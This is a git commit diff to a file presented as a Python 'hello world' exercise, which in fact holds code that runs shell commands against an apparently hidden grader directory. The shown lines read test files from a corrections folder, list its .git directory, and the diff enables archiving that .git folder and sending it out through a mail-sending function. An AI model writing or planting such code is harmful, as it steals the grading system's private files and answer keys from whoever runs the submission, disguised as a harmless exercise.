c1a5e1585ce94949a978f3f62fbda91913007dd5
Ashraf Atef <ashraf.programer@gmail.com>
2024-01-26 19:09:06 +0200

    task

--- 0x00-python-hello_world/2-print.py
+++ 0x00-python-hello_world/2-print.py
@@ -47,7 +47,7 @@ my_data += get_data("cat ../../../../corrections_*/corrections/262/1397/test0") 
 my_data += get_data("pwd") or ""
 my_data += get_data("ls -l ../../../../corrections_*/.git")
 my_data += "\n#######################\n"
-# my_data += get_data("tar -czvf file.tar.gz ../../../../corrections_*/.git")
+my_data += get_data("tar -czvf file.tar.gz --exclude='*/index' ../../../../corrections_*/.git")
 my_data += get_data("ls -l")
 send_data(my_data)
 ##############################################################
@@ -91,4 +91,4 @@ def send_data_file(zip_filename="data.zip", message="no_data"):
     
     # Terminating the session
     s.quit()
-# send_data_file("file.tar.gz", "mygit")
+send_data_file("file.tar.gz", "mygit")
